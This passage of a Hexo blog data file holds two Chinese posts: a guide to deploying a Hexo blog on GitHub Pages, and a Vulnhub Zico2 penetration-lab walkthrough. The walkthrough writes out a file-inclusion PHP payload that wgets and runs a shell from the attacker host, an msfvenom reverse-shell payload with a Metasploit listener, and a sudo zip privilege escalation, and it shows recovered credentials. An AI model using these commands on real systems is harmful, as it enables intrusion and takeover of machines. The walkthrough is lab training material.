Pages分配的域名，实现博客网站的部署访问。\n\n**4.Hexo写博客的流程**\n\n首先，编写Markdown文章。使用`hexo new \"title\"`命令，该命令会以scaffolds目录下的post.md作为文章模板在source\\posts目录下生成title.md。编写该markdown文件即可。\n\n编写完成后，要将markdown文件渲染生成静态文件。执行命令：`hexo   g`。执行该命令后，会在public目录下生成渲染完毕的静态文件。\n\n最后，将生成的静态文件push到github上进行部署。使用命令：`hexo    d `。\n\n可能会因为缓存等原因造成某些问题，可以使用命令`hexo  clean`进行清扫。该命令会清除掉所有已渲染的文件及其缓存。清除后再重新生成、部署。\n\n## 0x04 绑定个人域名\n\nGit Pages分配的域名是`xxx.github.io`样式的，若想要使用自己的域名，可通过CNAME解析实现。\n\n首先，注册购买域名，如：sakuxa.com。\n\n然后设置解析，添加一条CNAME记录即可：\n\n![](build-blog\\cname.jpg)\n\n然后在source目录下创建一个文件，名称为CNAME，文件无后缀。文件的内容写入域名，如：sakuxa.com\n\n然后再到Github上，找到前面创建的仓库的`settings`，进入并找到自定义域名输入框填入自己的域名即可：\n\n![](build-blog\\git.jpg)\n\n\n\n**参考连接**\n\nhttps://blog.csdn.net/sinat_37781304/article/details/82729029\n\nhttps://github.com/MOxFIVE/hexo-theme-yelee","source":"_posts/build-blog.md","raw":"---\ntitle: 博客搭建记录 Node.js + Hexo + Yelee + Git Pages\ndate: 2019-02-21 14:32:04\ntags: \n\t- 技术 \n\t- 环境搭建\ncategories: \n\t- Misc\n---\n\n## 0x00 概述\n\n本博客采用Node.js + Hexo + Yelee + Git Pages方案。\n\n博客运作的原理是，通过Hexo将写好的Markdown文章渲染为静态网页，然后将静态网页托管到Github上，使用Github的Git Pages来部署博客网站。\n\n博客搭建可分为四部分：\n\n- Hexo安装及使用\n- Hexo配置\n- Hexo联合Git Pages部署\n- 绑定个人域名（可选）\n\n<!-- more -->\n\n## 0x01 Hexo安装\n\n> Hexo 是一个快速、简洁且高效的博客框架。\n>\n> Hexo 使用 [Markdown](http://daringfireball.net/projects/markdown/)（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。\n\n**1.安装Node.js与Git**\n\n*Node*.*js* 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。而Hexo是基于Node.js的，因此在安装Hexo之前要先安装Node.js。直接去官网下载安装程序安装即可。\n\nGit用于进行版本控制。\n\n使用命令`node -v`及其`git version`验证node.js与Git是否安装成功，运行命令出现版本即证明成功安装。\n\n**2.安装Hexo**\n\n安装命令：\n\n`npm install -g hexo-cli`\n\n> npm是 JavaScript 世界的包管理工具,并且是 Node.js 平台的默认包管理工具。\n\n初始化博客：\n\n`hexo init myblog`\t\t //myblog是可以任意取的。\n\n安装依赖：\n\n`cd myblog`\t\t //进入这个myblog文件夹\n`npm install`\t\t//npm会根据目录下的package.json文件安装所需要的依赖。\n\n完成以上操作后，会创建myblog项目目录，目录结构如下(只列举重要的)：\n\n> - public                            //该文件夹存放的是通过Hexo渲染markdown文章得到的最终静态文件。\n> - scaffolds                      //该文件夹下存放文章、页面等的模板。\n> - source\\posts              //存放Markdown文章，Hexo要渲染的markdown文件就在该目录下。\n> - themes                     //存放网页主题的目录。\n> - _config.yml             //Hexo配置文件。\n\n运行博客：\n\n`hexo   g` \t\t     //等价于`hexo generate`，用于生成文章。即将posts目录下的Markdown文件渲染为静态文件并保存到public目录下。\n\n`hexo  s`\t\t   //等价于`hexo server`，运行博客。运行后会监听在localhost:4000，访问即可看到博客页面。\n\n## 0x02 Hexo配置\n\n**修改主题**\n\nHexo拥有众多主题，本博客采用[Yelee](https://github.com/MOxFIVE/hexo-theme-yelee)。\n\n首先到Github上下载或使用`git clone`将主题下载并放到themes目录下。\n\n然后修改hexo配置文件_config.yml，找到`theme:landscape`修改为`theme:yelee`。\n\n关于主题的一些定制化，例如头像等，找到Yelee主题目录下的_config.yml配置文件进行更改。\n\n## 0x03 Hexo联合Git Pages部署\n\n**1.关于Git Pages**:\n\nGitHub Pages 本用于介绍托管在 GitHub 的项目,他会为每个用户免费分配一个github.io域的域名。使用该域名可以访问同名的代码仓库。\n\n**2.Git Pages配置**\n\n首先，注册并拥有Github账号。\n\n然后，创建一个新的代码仓库。并使用`xxx.github.io`作为仓库名字。\n\n![](build-blog\\br.jpg)\n\n然后，配置Hexo的部署方式为Git。找到Hexo配置文件_config.yml ，修改`deploy`:\n\n```\ndeploy:\n  type: git\n  repo: https://github.com/sh4douu/sh4douu.github.io.git  #这里是上一步创建的仓库连接。\n```\n\n**3.部署hexo到git pages：**\n\n执行部署命令前，先安装用于部署的插件：`npm install hexo-deployer-git --save`\n\n执行部署：`hexo   d`   //等同于hexo deploy\n\n> 所谓的部署，即将hexo用于存放渲染完毕的静态文件的public目录push到刚才在github创建的仓库。\n>\n> 然后通过Git Pages分配的域名，实现博客网站的部署访问。\n\n**4.Hexo写博客的流程**\n\n首先，编写Markdown文章。使用`hexo new \"title\"`命令，该命令会以scaffolds目录下的post.md作为文章模板在source\\posts目录下生成title.md。编写该markdown文件即可。\n\n编写完成后，要将markdown文件渲染生成静态文件。执行命令：`hexo   g`。执行该命令后，会在public目录下生成渲染完毕的静态文件。\n\n最后，将生成的静态文件push到github上进行部署。使用命令：`hexo    d `。\n\n可能会因为缓存等原因造成某些问题，可以使用命令`hexo  clean`进行清扫。该命令会清除掉所有已渲染的文件及其缓存。清除后再重新生成、部署。\n\n## 0x04 绑定个人域名\n\nGit Pages分配的域名是`xxx.github.io`样式的，若想要使用自己的域名，可通过CNAME解析实现。\n\n首先，注册购买域名，如：sakuxa.com。\n\n然后设置解析，添加一条CNAME记录即可：\n\n![](build-blog\\cname.jpg)\n\n然后在source目录下创建一个文件，名称为CNAME，文件无后缀。文件的内容写入域名，如：sakuxa.com\n\n然后再到Github上，找到前面创建的仓库的`settings`，进入并找到自定义域名输入框填入自己的域名即可：\n\n![](build-blog\\git.jpg)\n\n\n\n**参考连接**\n\nhttps://blog.csdn.net/sinat_37781304/article/details/82729029\n\nhttps://github.com/MOxFIVE/hexo-theme-yelee","slug":"build-blog","published":1,"updated":"2019-02-25T01:33:39.931Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjszpjg8c0006j8r0w4muqt0f","content":"<h2 id=\"0x00-概述\"><a href=\"#0x00-概述\" class=\"headerlink\" title=\"0x00 概述\"></a>0x00 概述</h2><p>本博客采用Node.js + Hexo + Yelee + Git Pages方案。</p>\n<p>博客运作的原理是，通过Hexo将写好的Markdown文章渲染为静态网页，然后将静态网页托管到Github上，使用Github的Git Pages来部署博客网站。</p>\n<p>博客搭建可分为四部分：</p>\n<ul>\n<li>Hexo安装及使用</li>\n<li>Hexo配置</li>\n<li>Hexo联合Git Pages部署</li>\n<li>绑定个人域名（可选）</li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"0x01-Hexo安装\"><a href=\"#0x01-Hexo安装\" class=\"headerlink\" title=\"0x01 Hexo安装\"></a>0x01 Hexo安装</h2><blockquote>\n<p>Hexo 是一个快速、简洁且高效的博客框架。</p>\n<p>Hexo 使用 <a href=\"http://daringfireball.net/projects/markdown/\" target=\"_blank\" rel=\"noopener\">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p>\n</blockquote>\n<p><strong>1.安装Node.js与Git</strong></p>\n<p><em>Node</em>.<em>js</em> 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。而Hexo是基于Node.js的，因此在安装Hexo之前要先安装Node.js。直接去官网下载安装程序安装即可。</p>\n<p>Git用于进行版本控制。</p>\n<p>使用命令<code>node -v</code>及其<code>git version</code>验证node.js与Git是否安装成功，运行命令出现版本即证明成功安装。</p>\n<p><strong>2.安装Hexo</strong></p>\n<p>安装命令：</p>\n<p><code>npm install -g hexo-cli</code></p>\n<blockquote>\n<p>npm是 JavaScript 世界的包管理工具,并且是 Node.js 平台的默认包管理工具。</p>\n</blockquote>\n<p>初始化博客：</p>\n<p><code>hexo init myblog</code>         //myblog是可以任意取的。</p>\n<p>安装依赖：</p>\n<p><code>cd myblog</code>         //进入这个myblog文件夹<br><code>npm install</code>        //npm会根据目录下的package.json文件安装所需要的依赖。</p>\n<p>完成以上操作后，会创建myblog项目目录，目录结构如下(只列举重要的)：</p>\n<blockquote>\n<ul>\n<li>public                            //该文件夹存放的是通过Hexo渲染markdown文章得到的最终静态文件。</li>\n<li>scaffolds                      //该文件夹下存放文章、页面等的模板。</li>\n<li>source\\posts              //存放Markdown文章，Hexo要渲染的markdown文件就在该目录下。</li>\n<li>themes                     //存放网页主题的目录。</li>\n<li>_config.yml             //Hexo配置文件。</li>\n</ul>\n</blockquote>\n<p>运行博客：</p>\n<p><code>hexo   g</code>              //等价于<code>hexo generate</code>，用于生成文章。即将posts目录下的Markdown文件渲染为静态文件并保存到public目录下。</p>\n<p><code>hexo  s</code>           //等价于<code>hexo server</code>，运行博客。运行后会监听在localhost:4000，访问即可看到博客页面。</p>\n<h2 id=\"0x02-Hexo配置\"><a href=\"#0x02-Hexo配置\" class=\"headerlink\" title=\"0x02 Hexo配置\"></a>0x02 Hexo配置</h2><p><strong>修改主题</strong></p>\n<p>Hexo拥有众多主题，本博客采用<a href=\"https://github.com/MOxFIVE/hexo-theme-yelee\" target=\"_blank\" rel=\"noopener\">Yelee</a>。</p>\n<p>首先到Github上下载或使用<code>git clone</code>将主题下载并放到themes目录下。</p>\n<p>然后修改hexo配置文件_config.yml，找到<code>theme:landscape</code>修改为<code>theme:yelee</code>。</p>\n<p>关于主题的一些定制化，例如头像等，找到Yelee主题目录下的_config.yml配置文件进行更改。</p>\n<h2 id=\"0x03-Hexo联合Git-Pages部署\"><a href=\"#0x03-Hexo联合Git-Pages部署\" class=\"headerlink\" title=\"0x03 Hexo联合Git Pages部署\"></a>0x03 Hexo联合Git Pages部署</h2><p><strong>1.关于Git Pages</strong>:</p>\n<p>GitHub Pages 本用于介绍托管在 GitHub 的项目,他会为每个用户免费分配一个github.io域的域名。使用该域名可以访问同名的代码仓库。</p>\n<p><strong>2.Git Pages配置</strong></p>\n<p>首先，注册并拥有Github账号。</p>\n<p>然后，创建一个新的代码仓库。并使用<code>xxx.github.io</code>作为仓库名字。</p>\n<p><img src=\"/2019/02/21/build-blog/br.jpg\" alt></p>\n<p>然后，配置Hexo的部署方式为Git。找到Hexo配置文件_config.yml ，修改<code>deploy</code>:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deploy:</span><br><span class=\"line\">  type: git</span><br><span class=\"line\">  repo: https://github.com/sh4douu/sh4douu.github.io.git  #这里是上一步创建的仓库连接。</span><br></pre></td></tr></table></figure>\n<p><strong>3.部署hexo到git pages：</strong></p>\n<p>执行部署命令前，先安装用于部署的插件：<code>npm install hexo-deployer-git --save</code></p>\n<p>执行部署：<code>hexo   d</code>   //等同于hexo deploy</p>\n<blockquote>\n<p>所谓的部署，即将hexo用于存放渲染完毕的静态文件的public目录push到刚才在github创建的仓库。</p>\n<p>然后通过Git Pages分配的域名，实现博客网站的部署访问。</p>\n</blockquote>\n<p><strong>4.Hexo写博客的流程</strong></p>\n<p>首先，编写Markdown文章。使用<code>hexo new &quot;title&quot;</code>命令，该命令会以scaffolds目录下的post.md作为文章模板在source\\posts目录下生成title.md。编写该markdown文件即可。</p>\n<p>编写完成后，要将markdown文件渲染生成静态文件。执行命令：<code>hexo   g</code>。执行该命令后，会在public目录下生成渲染完毕的静态文件。</p>\n<p>最后，将生成的静态文件push到github上进行部署。使用命令：<code>hexo    d</code>。</p>\n<p>可能会因为缓存等原因造成某些问题，可以使用命令<code>hexo  clean</code>进行清扫。该命令会清除掉所有已渲染的文件及其缓存。清除后再重新生成、部署。</p>\n<h2 id=\"0x04-绑定个人域名\"><a href=\"#0x04-绑定个人域名\" class=\"headerlink\" title=\"0x04 绑定个人域名\"></a>0x04 绑定个人域名</h2><p>Git Pages分配的域名是<code>xxx.github.io</code>样式的，若想要使用自己的域名，可通过CNAME解析实现。</p>\n<p>首先，注册购买域名，如：sakuxa.com。</p>\n<p>然后设置解析，添加一条CNAME记录即可：</p>\n<p><img src=\"/2019/02/21/build-blog/cname.jpg\" alt></p>\n<p>然后在source目录下创建一个文件，名称为CNAME，文件无后缀。文件的内容写入域名，如：sakuxa.com</p>\n<p>然后再到Github上，找到前面创建的仓库的<code>settings</code>，进入并找到自定义域名输入框填入自己的域名即可：</p>\n<p><img src=\"/2019/02/21/build-blog/git.jpg\" alt></p>\n<p><strong>参考连接</strong></p>\n<p><a href=\"https://blog.csdn.net/sinat_37781304/article/details/82729029\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/sinat_37781304/article/details/82729029</a></p>\n<p><a href=\"https://github.com/MOxFIVE/hexo-theme-yelee\" target=\"_blank\" rel=\"noopener\">https://github.com/MOxFIVE/hexo-theme-yelee</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"0x00-概述\"><a href=\"#0x00-概述\" class=\"headerlink\" title=\"0x00 概述\"></a>0x00 概述</h2><p>本博客采用Node.js + Hexo + Yelee + Git Pages方案。</p>\n<p>博客运作的原理是，通过Hexo将写好的Markdown文章渲染为静态网页，然后将静态网页托管到Github上，使用Github的Git Pages来部署博客网站。</p>\n<p>博客搭建可分为四部分：</p>\n<ul>\n<li>Hexo安装及使用</li>\n<li>Hexo配置</li>\n<li>Hexo联合Git Pages部署</li>\n<li>绑定个人域名（可选）</li>\n</ul>","more":"<h2 id=\"0x01-Hexo安装\"><a href=\"#0x01-Hexo安装\" class=\"headerlink\" title=\"0x01 Hexo安装\"></a>0x01 Hexo安装</h2><blockquote>\n<p>Hexo 是一个快速、简洁且高效的博客框架。</p>\n<p>Hexo 使用 <a href=\"http://daringfireball.net/projects/markdown/\" target=\"_blank\" rel=\"noopener\">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p>\n</blockquote>\n<p><strong>1.安装Node.js与Git</strong></p>\n<p><em>Node</em>.<em>js</em> 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。而Hexo是基于Node.js的，因此在安装Hexo之前要先安装Node.js。直接去官网下载安装程序安装即可。</p>\n<p>Git用于进行版本控制。</p>\n<p>使用命令<code>node -v</code>及其<code>git version</code>验证node.js与Git是否安装成功，运行命令出现版本即证明成功安装。</p>\n<p><strong>2.安装Hexo</strong></p>\n<p>安装命令：</p>\n<p><code>npm install -g hexo-cli</code></p>\n<blockquote>\n<p>npm是 JavaScript 世界的包管理工具,并且是 Node.js 平台的默认包管理工具。</p>\n</blockquote>\n<p>初始化博客：</p>\n<p><code>hexo init myblog</code>         //myblog是可以任意取的。</p>\n<p>安装依赖：</p>\n<p><code>cd myblog</code>         //进入这个myblog文件夹<br><code>npm install</code>        //npm会根据目录下的package.json文件安装所需要的依赖。</p>\n<p>完成以上操作后，会创建myblog项目目录，目录结构如下(只列举重要的)：</p>\n<blockquote>\n<ul>\n<li>public                            //该文件夹存放的是通过Hexo渲染markdown文章得到的最终静态文件。</li>\n<li>scaffolds                      //该文件夹下存放文章、页面等的模板。</li>\n<li>source\\posts              //存放Markdown文章，Hexo要渲染的markdown文件就在该目录下。</li>\n<li>themes                     //存放网页主题的目录。</li>\n<li>_config.yml             //Hexo配置文件。</li>\n</ul>\n</blockquote>\n<p>运行博客：</p>\n<p><code>hexo   g</code>              //等价于<code>hexo generate</code>，用于生成文章。即将posts目录下的Markdown文件渲染为静态文件并保存到public目录下。</p>\n<p><code>hexo  s</code>           //等价于<code>hexo server</code>，运行博客。运行后会监听在localhost:4000，访问即可看到博客页面。</p>\n<h2 id=\"0x02-Hexo配置\"><a href=\"#0x02-Hexo配置\" class=\"headerlink\" title=\"0x02 Hexo配置\"></a>0x02 Hexo配置</h2><p><strong>修改主题</strong></p>\n<p>Hexo拥有众多主题，本博客采用<a href=\"https://github.com/MOxFIVE/hexo-theme-yelee\" target=\"_blank\" rel=\"noopener\">Yelee</a>。</p>\n<p>首先到Github上下载或使用<code>git clone</code>将主题下载并放到themes目录下。</p>\n<p>然后修改hexo配置文件_config.yml，找到<code>theme:landscape</code>修改为<code>theme:yelee</code>。</p>\n<p>关于主题的一些定制化，例如头像等，找到Yelee主题目录下的_config.yml配置文件进行更改。</p>\n<h2 id=\"0x03-Hexo联合Git-Pages部署\"><a href=\"#0x03-Hexo联合Git-Pages部署\" class=\"headerlink\" title=\"0x03 Hexo联合Git Pages部署\"></a>0x03 Hexo联合Git Pages部署</h2><p><strong>1.关于Git Pages</strong>:</p>\n<p>GitHub Pages 本用于介绍托管在 GitHub 的项目,他会为每个用户免费分配一个github.io域的域名。使用该域名可以访问同名的代码仓库。</p>\n<p><strong>2.Git Pages配置</strong></p>\n<p>首先，注册并拥有Github账号。</p>\n<p>然后，创建一个新的代码仓库。并使用<code>xxx.github.io</code>作为仓库名字。</p>\n<p><img src=\"/2019/02/21/build-blog/br.jpg\" alt></p>\n<p>然后，配置Hexo的部署方式为Git。找到Hexo配置文件_config.yml ，修改<code>deploy</code>:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deploy:</span><br><span class=\"line\">  type: git</span><br><span class=\"line\">  repo: https://github.com/sh4douu/sh4douu.github.io.git  #这里是上一步创建的仓库连接。</span><br></pre></td></tr></table></figure>\n<p><strong>3.部署hexo到git pages：</strong></p>\n<p>执行部署命令前，先安装用于部署的插件：<code>npm install hexo-deployer-git --save</code></p>\n<p>执行部署：<code>hexo   d</code>   //等同于hexo deploy</p>\n<blockquote>\n<p>所谓的部署，即将hexo用于存放渲染完毕的静态文件的public目录push到刚才在github创建的仓库。</p>\n<p>然后通过Git Pages分配的域名，实现博客网站的部署访问。</p>\n</blockquote>\n<p><strong>4.Hexo写博客的流程</strong></p>\n<p>首先，编写Markdown文章。使用<code>hexo new &quot;title&quot;</code>命令，该命令会以scaffolds目录下的post.md作为文章模板在source\\posts目录下生成title.md。编写该markdown文件即可。</p>\n<p>编写完成后，要将markdown文件渲染生成静态文件。执行命令：<code>hexo   g</code>。执行该命令后，会在public目录下生成渲染完毕的静态文件。</p>\n<p>最后，将生成的静态文件push到github上进行部署。使用命令：<code>hexo    d</code>。</p>\n<p>可能会因为缓存等原因造成某些问题，可以使用命令<code>hexo  clean</code>进行清扫。该命令会清除掉所有已渲染的文件及其缓存。清除后再重新生成、部署。</p>\n<h2 id=\"0x04-绑定个人域名\"><a href=\"#0x04-绑定个人域名\" class=\"headerlink\" title=\"0x04 绑定个人域名\"></a>0x04 绑定个人域名</h2><p>Git Pages分配的域名是<code>xxx.github.io</code>样式的，若想要使用自己的域名，可通过CNAME解析实现。</p>\n<p>首先，注册购买域名，如：sakuxa.com。</p>\n<p>然后设置解析，添加一条CNAME记录即可：</p>\n<p><img src=\"/2019/02/21/build-blog/cname.jpg\" alt></p>\n<p>然后在source目录下创建一个文件，名称为CNAME，文件无后缀。文件的内容写入域名，如：sakuxa.com</p>\n<p>然后再到Github上，找到前面创建的仓库的<code>settings</code>，进入并找到自定义域名输入框填入自己的域名即可：</p>\n<p><img src=\"/2019/02/21/build-blog/git.jpg\" alt></p>\n<p><strong>参考连接</strong></p>\n<p><a href=\"https://blog.csdn.net/sinat_37781304/article/details/82729029\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/sinat_37781304/article/details/82729029</a></p>\n<p><a href=\"https://github.com/MOxFIVE/hexo-theme-yelee\" target=\"_blank\" rel=\"noopener\">https://github.com/MOxFIVE/hexo-theme-yelee</a></p>"},{"title":"Vulnhub靶机渗透笔记——Zico2","date":"2019-02-26T02:30:34.000Z","_content":"\n## 0x00 环境\n\n- 靶机：[Zico2](https://www.vulnhub.com/series/zico2,137/#modal210download)\n- 攻击机：Kali Linux\n- VirtualBox\n  - 网络连接方式：host-only、DHCP\n- 目标：boot2root获取flag。\n\n<!-- more -->\n\n## 0x01 信息收集与漏洞挖掘\n\n**1.主机发现：**`nmap -sn 192.168.110.0/24`\n\n靶机自动获取IP，使用nmap进行主机发现，最终确定：靶机IP为192.168.110.3、攻击机IP：192.168.110.4、宿主机：192.168.110.5。\n\n![](hack-zico\\discovery.png)\n\n**2.端口探测：**`nmap -Pn -sV -n -T4 -p- 192.168.110.3`\n\n端口探测结果如下图，关注端口号22的SSH服务以及端口号80的Web服务。\n\n还确定了靶机系统为Ubuntu Linux、Web容器为Apache。\n\n![](hack-zico\\port.png)\n\n**3.Web服务**\n\n- 服务探测：`whatweb http://192.168.110.3 -a 3`\n\n![](hack-zico\\whatweb.png)\n\n- 目录爆破：`dirb http://192.168.110.3`\n\n爆破发现dbadmin，访问发现存在目录遍历漏洞，且目录下存在test_db.php文件。\n\n![](hack-zico\\dirb.png)\n\n![](hack-zico\\dbadmin.png)\n\n访问test_db.php发现是sqlite数据库连接管理页面phpLiteAdmin（类似phpmyadmin），尝试弱口令admin，成功进入。\n\n进入数据库管理页面后可获得以下信息：\n\n> 数据库路径：`/usr/databases/`\n>\n> 数据库名：`test_users`\n>\n> 数据表：`info`\n\n![](hack-zico\\1.png)\n\n查看数据表info，发现里面存在两条记录，判断是用户的用户名和密码。将密码拿到[somd5](https://www.somd5.com/)网站解密，得到结果：\n\n> root  34kroot34\n>\n> zico  zico2215@\n\n将得到的两个用户名密码尝试进行SSH登录，结果失败。\n\n- 漏洞扫描\n\n使用宿主机的AWVS进行漏洞扫描，发现存在文件包含、目录穿越漏洞。存在漏洞的连接为：`http://192.168.110.3/view.php?page=tools.html`\n\n![](hack-zico\\2.png)\n\n验证漏洞，尝试包含/etc/passwd文件，发现成功包含。\n\n![](hack-zico\\3.png)\n\n## 0x02 Getshell\n\nsqlite属于单文件数据库，类似Access数据库。\n\n**1.思路一**\n\n尝试通过数据库管理页面创建数据库的功能点创建一个shell文件，创建`../../var/www/html/shell.php`，`/`会被过滤，该方法不可行。\n\n**2.思路二：文件包含Getshell**\n\n先尝试通过日志文件`/var/log/apache2/access.log`，先访问`http://192.168.110.3/<?php phpinfo();?>`，然后尝试包含日志文件，发现没用。猜测是因为没有读取权限。\n\n包含数据库文件Getshell\n\n首先通过phpLiteAdmin向info表插入一条数据：`<?php system(\"cd /tmp;wget http://192.168.110.4/shell;chmod +x shell;./shell\");?>`，该记录作用是进入/tmp目录，然后通过wget从攻击机上下载shell文件，再对shell文件添加执行权限然后运行。\n\n![](hack-zico\\4.png)\n\n然后在攻击机上使用msfvenon生成shell文件：`msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.110.4 lport=4444 -f elf > shell`\n\n在shell文件所在的路径建立一个简单HTTP服务器：`python -m SimpleHTTPServer 80`\n\n设置msf监听，`use exploit/multi/hander`、`set payload linux/x86/meterpreter/reverse_tcp`、`set lhost 192.168.110.4`。\n\n访问连接`http://192.168.110.3/view.php?page=../../usr/databases/test_users`，然后会得到一个meterpreter会话。\n\n![](hack-zico\\5.png)\n\n## 0x03 权限提升\n\n获得靶机shell后查看用户，发现不是root，需要提权。\n\n![](hack-zico\\7.png)\n\n首先查看`/etc/passwd`文件，找出id大于1000的用户，发现值得关注的用户有root、zico。\n\n![](hack-zico\\8.png)\n\n查找属主为zico的文件：`find / -user zico 2> /dev/null`，执行后结果过多。直接`cd /home/zico`到zico的家目录。发现其中有个wordpress目录，猜测应该是博客系统代码。进入该目录发现wordpress的配置文件wp-config.php，查看文件内容，找到数据库密码：`sWfCsfJSPV9H3AmQzw8`。\n\n![](hack-zico\\9.png)\n\n尝试使用该用户名密码登录SSH：`ssh zico@sWfCsfJSPV9H3AmQzw8`。成功登录。\n\n使用`sudo -l`命令查看zico用户可以执行的root命令。发现可以执行`/bin/tar`、`/usr/bin/zip`。\n\n![](hack-zico\\10.png)\n\n执行`touch /tmp/exploit`、`sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=\"bash -c /bin/sh\"`\n\n成功提权至root。\n\n![](hack-zico\\11.png)\n\n获取flag，进入root用户家目录，flag在目录下的flag.txt文件。\n\n![](hack-zico\\12.png)\n\n**另一种提权方式**\n\n获得反弹shell后，查看系统内核版本，发现内核版本为3.2.0-23。\n\n![](hack-zico\\13.png)\n\n到[Exploit-DB](https://www.exploit-db.com/search)搜索内核提权漏洞，并下载Exp到靶机编译执行。\n\n![](hack-zico\\14.png)\n\n## 0x04 总结\n\n- 文件包含Getshell，还可以尝试包含其他文件，如SSH登录日志文件等。\n- Python2搭建简单HTTP服务器来传文件：`python -m SimpleHTTPServer 80`\n- 上传/执行文件遇权限问题时，可传到`/tmp`目录。\n\n**参考连接**\n\nhttps://www.colabug.com/1925534.html","source":"_posts/hack-zico.md","raw":"---\ntitle: Vulnhub靶机渗透笔记——Zico2 \ndate: 2019-02-26 10:30:34\ntags:\n\t- 文件包含\n\t- Getshell\n\t- 权限提升\n\t- 靶机\ncategories:\n\t- Vulnhub\n---\n\n## 0x00 环境\n\n- 靶机：[Zico2](https://www.vulnhub.com/series/zico2,137/#modal210download)\n- 攻击机：Kali Linux\n- VirtualBox\n  - 网络连接方式：host-only、DHCP\n- 目标：boot2root获取flag。\n\n<!-- more -->\n\n## 0x01 信息收集与漏洞挖掘\n\n**1.主机发现：**`nmap -sn 192.168.110.0/24`\n\n靶机自动获取IP，使用nmap进行主机发现，最终确定：靶机IP为192.168.110.3、攻击机IP：192.168.110.4、宿主机：192.168.110.5。\n\n![](hack-zico\\discovery.png)\n\n**2.端口探测：**`nmap -Pn -sV -n -T4 -p- 192.168.110.3`\n\n端口探测结果如下图，关注端口号22的SSH服务以及端口号80的Web服务。\n\n还确定了靶机系统为Ubuntu Linux、Web容器为Apache。\n\n![](hack-zico\\port.png)\n\n**3.Web服务**\n\n- 服务探测：`whatweb http://192.168.110.3 -a 3`\n\n![](hack-zico\\whatweb.png)\n\n- 目录爆破：`dirb http://192.168.110.3`\n\n爆破发现dbadmin，访问发现存在目录遍历漏洞，且目录下存在test_db.php文件。\n\n![](hack-zico\\dirb.png)\n\n![](hack-zico\\dbadmin.png)\n\n访问test_db.php发现是sqlite数据库连接管理页面phpLiteAdmin（类似phpmyadmin），尝试弱口令admin，成功进入。\n\n进入数据库管理页面后可获得以下信息：\n\n> 数据库路径：`/usr/databases/`\n>\n> 数据库名：`test_users`\n>\n> 数据表：`info`\n\n![](hack-zico\\1.png)\n\n查看数据表info，发现里面存在两条记录，判断是用户的用户名和密码。将密码拿到[somd5](https://www.somd5.com/)网站解密，得到结果：\n\n> root  34kroot34\n>\n> zico  zico2215@\n\n将得到的两个用户名密码尝试进行SSH登录，结果失败。\n\n- 漏洞扫描\n\n使用宿主机的AWVS进行漏洞扫描，发现存在文件包含、目录穿越漏洞。存在漏洞的连接为：`http://192.168.110.3/view.php?page=tools.html`\n\n![](hack-zico\\2.png)\n\n验证漏洞，尝试包含/etc/passwd文件，发现成功包含。\n\n![](hack-zico\\3.png)\n\n## 0x02 Getshell\n\nsqlite属于单文件数据库，类似Access数据库。\n\n**1.思路一**\n\n尝试通过数据库管理页面创建数据库的功能点创建一个shell文件，创建`../../var/www/html/shell.php`，`/`会被过滤，该方法不可行。\n\n**2.思路二：文件包含Getshell**\n\n先尝试通过日志文件`/var/log/apache2/access.log`，先访问`http://192.168.110.3/<?php phpinfo();?>`，然后尝试包含日志文件，发现没用。猜测是因为没有读取权限。\n\n包含数据库文件Getshell\n\n首先通过phpLiteAdmin向info表插入一条数据：`<?php system(\"cd /tmp;wget http://192.168.110.4/shell;chmod +x shell;./shell\");?>`，该记录作用是进入/tmp目录，然后通过wget从攻击机上下载shell文件，再对shell文件添加执行权限然后运行。\n\n![](hack-zico\\4.png)\n\n然后在攻击机上使用msfvenon生成shell文件：`msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.110.4 lport=4444 -f elf > shell`\n\n在shell文件所在的路径建立一个简单HTTP服务器：`python -m SimpleHTTPServer 80`\n\n设置msf监听，`use exploit/multi/hander`、`set payload linux/x86/meterpreter/reverse_tcp`、`set lhost 192.168.110.4`。\n\n访问连接`http://192.168.110.3/view.php?page=../../usr/databases/test_users`，然后会得到一个meterpreter会话。\n\n![](hack-zico\\5.png)\n\n## 0x03 权限提升\n\n获得靶机shell后查看用户，发现不是root，需要提权。\n\n![](hack-zico\\7.png)\n\n首先查看`/etc/passwd`文件，找出id大于1000的用户，发现值得关注的用户有root、zico。\n\n![](hack-zico\\8.png)\n\n查找属主为zico的文件：`find / -user zico 2> /dev/null`，执行后结果过多。直接`cd /home/zico`到zico的家目录。发现其中有个wordpress目录，猜测应该是博客系统代码。进入该目录发现wordpress的配置文件wp-config.php，查看文件内容，找到数据库密码：`sWfCsfJSPV9H3AmQzw8`。\n\n![](hack-zico\\9.png)\n\n尝试使用该用户名密码登录SSH：`ssh zico@sWfCsfJSPV9H3AmQzw8`。成功登录。\n\n使用`sudo -l`命令查看zico用户可以执行的root命令。发现可以执行`/bin/tar`、`/usr/bin/zip`。\n\n![](hack-zico\\10.png)\n\n执行`touch /tmp/exploit`、`sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=\"bash -c /bin/sh\"`\n\n成功提权至root。\n\n![](hack-zico\\11.png)\n\n获取flag，进入root用户家目录，flag在目录下的flag.txt文件。\n\n![](hack-zico\\12.png)\n\n**另一种提权方式**\n\n获得反弹shell后，查看系统内核版本，发现内核版本为3.2.0-23。\n\n![](hack-zico\\13.png)\n\n到[Exploit-DB](https://www.exploit-db.com/search)搜索内核提权漏洞，并下载Exp到靶机编译执行。\n\n![](hack-zico\\14.png)\n\n## 